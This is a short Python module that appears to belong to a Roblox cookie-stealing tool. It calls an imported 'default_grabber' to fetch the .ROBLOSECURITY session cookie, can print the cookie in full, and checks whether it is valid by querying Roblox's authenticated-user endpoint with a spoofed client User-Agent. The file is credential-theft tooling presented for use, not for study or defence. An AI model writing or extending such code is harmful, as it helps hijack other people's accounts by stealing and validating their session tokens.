import json
from typing import override
import urllib.request
import urllib.error
import dataclasses
import functools

from . import _logic as logic
from assets import default_grabber


@dataclasses.dataclass(kw_only=True, unsafe_hash=True)
class obj_type(logic.base_entry):
    verbose: bool
    validate: bool

    @functools.cache
    def get_rōblox_cookie(self) -> str | None:
        return default_grabber.get_rōblox_cookie()

    @override
    def process(self) -> None:
        super().process()

        cookie = self.get_rōblox_cookie()
        if cookie is None:
            print('No cookie is provided.')
            return

        if not self.validate:
            if self.verbose:
                print(cookie)
            else:
                print('A cookie is provided.')
            return

        req = urllib.request.Request('https://users.roblox.com/v1/users/authenticated')
        req.add_header('User-Agent', 'Roblox/WinInet')
        req.add_header('Cookie', f'.ROBLOSECURITY={cookie}')
        try:
            with urllib.request.urlopen(req) as response:
                data = json.loads(response.read())
                print(data)
        except urllib.error.HTTPError as e:
            print('The provided cookie is likely invalid.')
